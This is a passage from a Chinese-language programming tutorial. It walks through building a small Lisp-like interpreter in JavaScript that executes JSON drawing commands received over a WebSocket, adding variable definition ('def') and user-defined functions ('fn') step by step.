</code></pre></div><h2 id="更牛啤一点"><a href="#更牛啤一点" class="header-anchor">#</a> 更牛啤一点</h2> <p>现在更有意思的来了，假如我们想支持<strong>变量定义</strong>，行不行呢？</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> shape <span class="token operator">=</span> <span class="token function">drawLine</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">rotate</span><span class="token punctuation">(</span>shape<span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>如果我们能够支持变量定义，那么用户就可以实现一些高级命令了！首先让我们将上面的代码转换成之前我们使用的JSON：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span><span class="token string">&quot;def&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;shape&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token string">&quot;rotate&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;shape&quot;</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span>
</code></pre></div><p>还不戳！如果我们可以支持上面的命令，那我们就碉堡了！看下面：</p> <div class="language-js extra-class"><div class="highlight-lines"><br><div class="highlighted"> </div><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></div><pre class="language-js"><code>webSocket<span class="token punctuation">.</span><span class="token function">onMessage</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">instructions</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> variables <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> fns <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token operator">...</span><span class="token punctuation">,</span>
    <span class="token function-variable function">def</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> v</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      variables<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> v<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token function-variable function">parseInstruction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ins</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>variables<span class="token punctuation">[</span>ins<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 此时对应变量，比如 shape</span>
      <span class="token keyword">return</span> variables<span class="token punctuation">[</span>ins<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>ins<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 此时一定是原始类型，例如 { x: 0, y: 0 }</span>
      <span class="token keyword">return</span> ins<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">const</span> <span class="token punctuation">[</span>fName<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">]</span> <span class="token operator">=</span> ins<span class="token punctuation">;</span>
    <span class="token keyword">return</span> fns<span class="token punctuation">[</span>fName<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>parseInstructions<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">parseInstruction</span><span class="token punctuation">(</span>instructions<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>在第二行我们引入了一个<code>variables</code>的对象，用来保存每个我们定义的变量。<code>def</code>函数的作用就是更新<code>variables</code>对象。现在我们可以运行下面的命令了：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span>
  <span class="token string">&quot;do&quot;</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;def&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;shape&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;rotate&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;shape&quot;</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>;
</code></pre></div><p>针不戳！</p> <h2 id="无敌牛啤-目标"><a href="#无敌牛啤-目标" class="header-anchor">#</a> 无敌牛啤：目标</h2> <p>现在让我们更上一层楼。如果我们能够让远程用户自定义他们自己的函数呢？</p> <p>比方说他们想做到这样的效果：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">drawTriangle</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">left<span class="token punctuation">,</span> top<span class="token punctuation">,</span> right<span class="token punctuation">,</span> color</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token function">drawLine</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> top<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">drawLine</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> right<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">drawLine</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">drawTriangle</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>要怎么做呢？同样地让我们回到我们最初的想法，首先将上面的js转换成JSON命令的格式，下面是转换后的样子：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span><span class="token string">&quot;def&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;drawTriangle&quot;</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;fn&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token string">&quot;do&quot;</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">[</span><span class="token string">&quot;drawTriangle&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</code></pre></div><p>这里我们将</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> drawTriangle <span class="token operator">=</span> <span class="token operator">...</span>
</code></pre></div><p>转换成了：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span><span class="token string">&quot;def&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;drawTriangle&quot;</span><span class="token punctuation">,</span> ...<span class="token punctuation">]</span>
</code></pre></div><p>以及我们将</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">left<span class="token punctuation">,</span> top<span class="token punctuation">,</span> right<span class="token punctuation">,</span> color</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span>
</code></pre></div><p>转换成了：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span><span class="token string">&quot;fn&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;do&quot;</span> ...<span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre></div><p>那么现在我们剩下的工作就是试着支持这些命令了，看上去也不那么困难嘛。</p> <h2 id="无敌牛啤-关键"><a href="#无敌牛啤-关键" class="header-anchor">#</a> 无敌牛啤：关键</h2> <p>实现上述目标的关键在于支持<code>[&quot;fn&quot;, ...]</code>这个命令。我们可以这样：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> parseFnInstruction <span class="token operator">=</span> <span class="token punctuation">(</span>args<span class="token punctuation">,</span> body<span class="token punctuation">,</span> oldVariables<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>values</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> newVariables <span class="token operator">=</span> <span class="token punctuation">{</span>
      <span class="token operator">...</span>oldVariables<span class="token punctuation">,</span>
      <span class="token operator">...</span><span class="token function">mapArgsWithValues</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> values<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">parseInstruction</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> newVariables<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><p>当我们遇到<code>fn</code>命令的时候，我们就去执行<code>parseFnInstruction</code>，这个函数将会得到一个新的函数。</p> <p>之前我们调用<code>drawTriangle</code>函数是这样的：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span><span class="token string">&quot;drawTriangle&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">]</span>
</code></pre></div><p>当<code>parseFnInstruction</code>执行后，<code>values</code>就会变成：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">]</span>
</code></pre></div><p>然后，</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> newVariables <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">...</span>oldVariables<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token function">mapArgsWithValues</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> values<span class="token punctuation">)</span><span class="token punctuation">}</span>
</code></pre></div><p>这里将会创造一个新的<code>variables</code>对象，它包含了从函数参数到最新的values的字典：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> newVariables <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token operator">...</span>oldVariables<span class="token punctuation">,</span>
  <span class="token literal-property property">left</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token literal-property property">top</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token literal-property property">right</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre></div><p>然后，我们就可以去执行函数体了，这个例子是这样：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span>
  <span class="token string">&quot;do&quot;</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">,</span>
</code></pre></div><p><code>parseInstruction</code>在执行的时候，可以从<code>newVariables</code>中正确拿到<code>&quot;left&quot;</code>变量的值<code>{ x: 0, y: 0}</code>，其他的部分同理。</p> <p>如果我们做到上面这些，哈，支持函数定义的大部分工作就算是做完了！</p> <h2 id="无敌牛啤-执行"><a href="#无敌牛啤-执行" class="header-anchor">#</a> 无敌牛啤：执行</h2> <p>让我们再回顾一下我们的计划。首先，我们需要让<code>parseInstruction</code>接受<code>variables</code>作为参数。为了做到这一点，我们需要修改一下<code>parseInstruction</code>：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">parseInstruction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ins<span class="token punctuation">,</span> variables</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token operator">...</span>
  <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">parseInstruction</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> variables<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">parseInstruction</span><span class="token punctuation">(</span>instruction<span class="token punctuation">,</span> variables<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>接下来，我们需要判断一下是否我们遇到了函数定义“fn”命令：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">parseInstruction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ins<span class="token punctuation">,</span> variables</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token operator">...</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>fName<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">]</span> <span class="token operator">=</span> ins<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>fName <span class="token operator">===</span> <span class="token string">'fn'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">parseFnInstruction</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">,</span> variables<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token operator">...</span>

  <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">parseInstruction</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> variables<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token function">parseInstruction</span><span class="token punctuation">(</span>instruction<span class="token punctuation">,</span> variables<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>下面就是我们的<code>parseFnInstruction</code>：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">mapArgsWithValues</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">args<span class="token punctuation">,</span> values</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> args<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res<span class="token punctuation">,</span> k<span class="token punctuation">,</span> idx</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> values<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">parseFnInstruction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">args<span class="token punctuation">,</span> body<span class="token punctuation">,</span> oldVariables</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>values</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> newVariables <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">...</span>oldVariables<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token function">mapArgsWithValues</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> values<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">parseInstruction</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> newVariables<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><p>就像我们之前说的，<code>parseFnInstruction</code>将返回一个新的函数。实际上它做了两件事：</p> <ol><li>创建一个<code>newVariables</code>对象，构造<code>args</code>和<code>values</code>的字典。</li> <li>将<code>body</code>和构造出来的新的<code>newVariables</code>传入<code>parseInstruction</code>。</li></ol> <p>好了，到此差不多就做完了。最终的代码如下所示：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">parseInstruction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ins<span class="token punctuation">,</span> variables</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token operator">...</span>

  <span class="token keyword">const</span> <span class="token punctuation">[</span>fName<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">]</span> <span class="token operator">=</span> ins<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fName <span class="token operator">===</span> <span class="token string">'fn'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">parseFnInstruction</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">,</span> variables<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">const</span> fn <span class="token operator">=</span> fns<span class="token punctuation">[</span>fName<span class="token punctuation">]</span> <span class="token operator">||</span> variables<span class="token punctuation">[</span>fName<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">parseInstruction</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> variables<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><p>支持函数定义的秘诀在于：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> fn <span class="token operator">=</span> fns<span class="token punctuation">[</span>fName<span class="token punctuation">]</span> <span class="token operator">||</span> variables<span class="token punctuation">[</span>fName<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre></div><p>因为我们会从<code>fns</code>和<code>variables</code>中获取<code>fn</code>的定义。最后把其他部分也加上，it works！</p> <div class="language-js extra-class"><pre class="language-js"><code>webSocket<span class="token punctuation">.</span><span class="token function">onMessage</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">instructions</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> variables <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> fns <span class="token operator">=</span> <span class="token punctuation">{</span>
    drawLine<span class="token punctuation">,</span>
    drawPoint<span class="token punctuation">,</span>
    rotate<span class="token punctuation">,</span>
    <span class="token function-variable function">do</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> args<span class="token punctuation">[</span>args<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token function-variable function">def</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> v</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      variables<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> v<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token function-variable function">mapArgsWithValues</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">args<span class="token punctuation">,</span> values</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> args<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res<span class="token punctuation">,</span> k<span class="token punctuation">,</span> idx</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      res<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> values<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
